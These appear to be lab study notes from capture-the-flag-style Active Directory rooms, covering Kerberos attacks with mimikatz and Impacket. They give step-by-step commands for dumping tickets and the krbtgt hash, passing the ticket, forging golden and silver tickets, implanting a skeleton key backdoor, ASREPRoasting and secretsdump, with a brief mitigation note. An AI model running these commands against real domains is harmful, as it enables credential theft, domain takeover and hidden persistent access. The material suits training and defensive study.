+<p>Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image291.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>&nbsp;</p>
+<p>Prepare Mimikatz &amp; Dump Tickets -&nbsp;</p>
+<p>You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.</p>
+<p>1.)&nbsp;cd Downloads&nbsp;- navigate to the directory mimikatz is in</p>
+<p>2.)&nbsp;mimikatz.exe&nbsp;- run mimikatz</p>
+<p>3.)&nbsp;privilege::debug&nbsp;- Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image293.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>4.)&nbsp;sekurlsa::tickets /export&nbsp;- this will export all of the .kirbi tickets into the directory that you are currently in</p>
+<p>At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image295.jpg" alt="Afbeelding met tafel
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.</p>
+<p>Pass the Ticket w/ Mimikatz</p>
+<p>Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.</p>
+<p>1.)&nbsp;kerberos::ptt &lt;ticket&gt;&nbsp;- run this command inside of mimikatz with the ticket that you harvested from earlier.&nbsp;It will cache and impersonate the given ticket</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image297.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>2.)&nbsp;klist&nbsp;- Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.</p>
+<p>We will not be using mimikatz for the rest of the attack.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image299.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image300.png" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.</p>
+<p>Pass the Ticket Mitigation -</p>
+<p>Let's talk blue team and how to mitigate these types of attacks.&nbsp;</p>
+<p>Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.</p>
+<p>&nbsp;</p>
+<h2>Golden, silver attacks with Mimikatz</h2>
+<p>Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.</p>
+<p>A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.</p>
+<p>A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.</p>
+<p>KRBTGT Overview&nbsp;</p>
+<p>In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.</p>
+<p>Golden/Silver Ticket Attack Overview -&nbsp;</p>
+<p>A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image302.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Dump the krbtgt hash -</p>
+<p>﻿1.)&nbsp;cd downloads &amp;&amp; mimikatz.exe&nbsp;- navigate to the directory mimikatz is in and run mimikatz</p>
+<p>2.)&nbsp;privilege::debug&nbsp;- ensure this outputs [privilege '20' ok]</p>
+<p>﻿3.)&nbsp;lsadump::lsa /inject /name:krbtgt&nbsp;- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image304.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Create a Golden/Silver Ticket -&nbsp;</p>
+<p>﻿1.)&nbsp;Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:&nbsp;- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.</p>
+<p>I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image306.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Use the Golden/Silver Ticket to access other machines -</p>
+<p>﻿1.)&nbsp;misc::cmd&nbsp;- this will open a new elevated command prompt with the given ticket in mimikatz.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image307.png"></figure>
+<p>2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image309.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.</p>
+<p>&nbsp;</p>
+<h2>Kerberos backdoors with Mimikatz</h2>
+<p>Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.&nbsp;</p>
+<p>The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.&nbsp;</p>
+<p>The default hash for a mimikatz skeleton key is&nbsp;<i>60BA4FCADC466C7A033C178194C03DF6</i>&nbsp;which makes the password -"<i>mimikatz</i>"</p>
+<p>This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.</p>
+<p>Skeleton Key Overview -</p>
+<p>The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the&nbsp;skeleton key NT hash allowing you access to the domain forest.</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image311.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Preparing Mimikatz -&nbsp;</strong></p>
+<p>1.)&nbsp;cd Downloads &amp;&amp; mimikatz.exe&nbsp;- Navigate to the directory mimikatz is in and run mimikatz</p>
+<p>2.)&nbsp;privilege::debug&nbsp;- This should be a standard for running mimikatz as mimikatz needs local administrator access</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image313.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Installing the Skeleton Key w/ mimikatz -</strong></p>
+<p>1.)&nbsp;misc::skeleton&nbsp;- Yes! that's it but don't underestimate this small command it is very powerful</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image315.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><strong>Accessing the forest -&nbsp;</strong></p>
+<p>The default credentials will be: "<i>mimikatz</i>"</p>
+<p>example:&nbsp;net use c:\\DOMAIN-CONTROLLER\admin$&nbsp;/user:Administrator mimikatz&nbsp;- The share will now be accessible without the need for the Administrators password</p>
+<p>example:&nbsp;dir \\Desktop-1\c$ /user:Machine1 mimikatz&nbsp;- access the directory of Desktop-1 without ever knowing what users have access to Desktop-1</p>
+<p>The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.</p>
+<p>&nbsp;</p>
+<h2>Conclusion</h2>
+<p>Resources -</p>
+<ul>
+  <li><a href="https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a">https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a</a></li>
+  <li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat</a></li>
+  <li><a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1</a></li>
+  <li><a href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></li>
+  <li><a href="https://www.varonis.com/blog/kerberos-authentication-explained/">https://www.varonis.com/blog/kerberos-authentication-explained/</a></li>
+  <li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf</a></li>
+  <li><a href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf">https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf</a></li>
+  <li><a href="https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf">https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf</a></li>
+</ul>
+<h1>Attacktive Directory, a showcase</h1>
+<p>This machine has a number of typical attack options that we can abuse. In order to do that, we need a few tools.</p>
+<p>&nbsp;</p>
+<p><strong>Installing Impacket:</strong></p>
+<p>Whether you're on the Kali 2019.3 or Kali 2021.1, Impacket can be a pain to install&nbsp; correctly. Here's some instructions that may help you install it correctly!</p>
+<p>First, you will need to clone the Impacket Github repo onto your box. The following command will clone Impacket into /opt/impacket:</p>
+<p><code>git clone&nbsp;https://github.com/SecureAuthCorp/impacket.git /opt/impacket</code></p>
+<p>After the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. A commonly skipped file during the installation is setup.py, this actually installs Impacket onto your system so you can use it and not have to worry about any dependencies.</p>
+<p>To install the Python requirements for Impacket:</p>
+<p><code>pip3 install -r /opt/impacket/requirements.txt</code></p>
+<p>Once the requirements have finished installing, we can then run the python setup install script:</p>
+<p><code>cd /opt/impacket/ &amp;&amp; python3 ./setup.py install</code></p>
+<p>After that, Impacket should be correctly installed now and it should be ready to use!</p>
+<p>&nbsp;</p>
+<p>If you are still having issues, you can try the following script and see if this works:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">sudo git clone&nbsp;<a href="https://github.com/SecureAuthCorp/impacket.git">https://github.com/SecureAuthCorp/impacket.git</a> /opt/impacket sudo pip3 install -r /opt/impacket/requirements.txt cd /opt/impacket/ sudo pip3 install . sudo python3 setup.py install</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>Credit for proper Impacket install instructions goes to Dragonar#0923 in the&nbsp;<a href="https://discord.gg/tryhackme">THM Discord</a>&nbsp;&lt;3</p>
+<p>&nbsp;</p>
+<p>Installing Bloodhound and Neo4j</p>
+<p>Bloodhound is another tool that we'll be utilizing while attacking Attacktive Directory. We'll cover specifcs of the tool later, but for now, we need to install two packages with Apt, those being bloodhound and neo4j. You can install it with the following command:</p>
+<p><code>apt install bloodhound neo4j</code></p>
+<p>&nbsp;Now that it's done, you're ready to go!</p>
+<p>&nbsp;</p>
+<p>Troubleshooting</p>
+<p>If you are having issues installing Bloodhound and Neo4j, try issuing the following command:</p>
+<p><code>apt update &amp;&amp; apt upgrade</code></p>
+<p>&nbsp;</p>
+<h2>Enumeration</h2>
+<p>Basic enumeration starts out with an&nbsp;nmap scan. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.</p>
+<p>For more information on nmap, check out the&nbsp;<a href="https://tryhackme.com/room/furthernmap">nmap room</a>.</p>
+<p>&nbsp;</p>
+<p>Notes<i>:&nbsp;</i>Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\User at the Window's login prompt) and Administrator via Evil-WinRM.</p>
+<p>&nbsp;</p>
+<p><strong>enum4linux</strong></p>
+<p>A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.</p>
+<p>Enum4linux is a tool for enumerating information from Windows and Samba systems. It attempts to offer similar functionality to enum.exe formerly available from&nbsp;<a href="http://www.bindview.com/">www.bindview.com</a>.</p>
+<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>
+<p>The tool usage can be found below followed by examples, previous versions of the tool can be found at the bottom of the page.</p>
+<p>Also see:&nbsp;<a href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>
+<p>&nbsp;</p>
+<p><strong>Kerbrute</strong></p>
+<p>A&nbsp;whole host of other services are running, including&nbsp;<strong>Kerberos</strong>. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called&nbsp;<a href="https://github.com/ropnop/kerbrute/releases">Kerbrute</a>&nbsp;(by Ronnie Flathers&nbsp;<a href="https://twitter.com/ropnop">@ropnop</a>) to brute force discovery of users, passwords and even password spray!</p>
+<p><strong>Note:&nbsp;</strong>Several users have informed me that the latest version of Kerbrute does not contain the UserEnum flag in Kerbrute, if that is the case with the version you have selected, try a older version!</p>
+<p>For this box, a modified&nbsp;<a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt">User List</a>&nbsp;and&nbsp;<a href="https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt">Password List</a>&nbsp;will be used to cut down on time of enumeration of users and password hash cracking. It is&nbsp;<strong>NOT&nbsp;</strong>recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.</p>
+<p>&nbsp;</p>
+<h2>Exploitation: abusing Kerberos</h2>
+<p>After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called&nbsp;<strong>ASREPRoasting.&nbsp;</strong>ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account&nbsp;<strong>does not</strong>&nbsp;need to provide valid identification before requesting a Kerberos Ticket on the specified user account.</p>
+<p><strong>Retrieving Kerberos Tickets</strong></p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>&nbsp;has a tool&nbsp;called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.</p>
+<p>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? Kerberos 5 AS-REP etype 23</p>
+<p>What mode is the hash? 18200</p>
+<p>&nbsp;</p>
+<h2>Enumeration: back to the basics</h2>
+<p>With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.</p>
+<p>Smbclient -L will help listing all shares.&nbsp;</p>
+<h2>Domain privilege escalation</h2>
+<p>Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?</p>
+<p>Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account.&nbsp;This includes password hashes</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image317.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.</p>
+<p>&nbsp;</p>
